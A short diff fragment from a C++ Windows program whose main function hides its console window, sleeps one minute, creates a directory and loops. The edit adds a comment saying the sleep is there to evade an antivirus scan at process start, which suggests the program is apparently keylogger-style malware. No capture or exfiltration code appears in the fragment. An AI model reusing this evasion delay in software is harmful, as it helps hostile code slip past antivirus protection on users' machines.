@@ -15,7 +15,7 @@ int main()
 {
 	hide(); // set console window to appear for a instant
 	MSG Msg; // msg object to be processed, but actually never is processed
-	std::this_thread::sleep_for(std::chrono::minutes(1));
+	std::this_thread::sleep_for(std::chrono::minutes(1)); //sleep 1 minute in case of scan antivirus when process run
 	IO::MKDir(IO::GetOurPath(true));
 	while (true)
 	{
